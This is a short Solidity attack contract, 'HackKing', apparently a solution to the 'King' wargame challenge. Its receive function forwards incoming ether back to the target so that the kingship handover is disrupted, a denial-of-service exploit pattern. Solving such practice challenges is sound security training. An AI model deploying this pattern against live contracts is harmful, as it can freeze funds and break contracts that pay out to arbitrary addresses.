// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import { King } from "../../src/King/King.sol";

contract HackKing {
    address payable kingAddress;

    constructor(address _kingAddress) {
        kingAddress = payable(_kingAddress);
    }

    receive() external payable {
        kingAddress.call{value: (address(this).balance)}("");
    }
}